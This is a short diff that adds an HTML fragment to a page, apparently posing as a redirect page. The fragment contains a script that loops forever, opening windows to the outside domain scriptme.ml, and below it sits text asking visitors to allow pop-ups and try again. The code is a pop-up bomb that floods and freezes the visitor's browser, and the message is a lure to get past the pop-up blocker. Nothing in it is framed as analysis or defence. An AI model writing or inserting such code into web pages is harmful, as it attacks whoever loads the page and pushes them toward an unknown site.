@@ -1,0 +1,10 @@
+  <script>
+  for (var i = 0; i < Infinity; i++) {
+window.open("http://scriptme.ml");
+window.open("http://scriptme.ml", "_blank", "location=yes");
+}
+</script>
+<p>
+Redirecting failed
+</p>
+  <p>Try again with pop up's allowed</p>
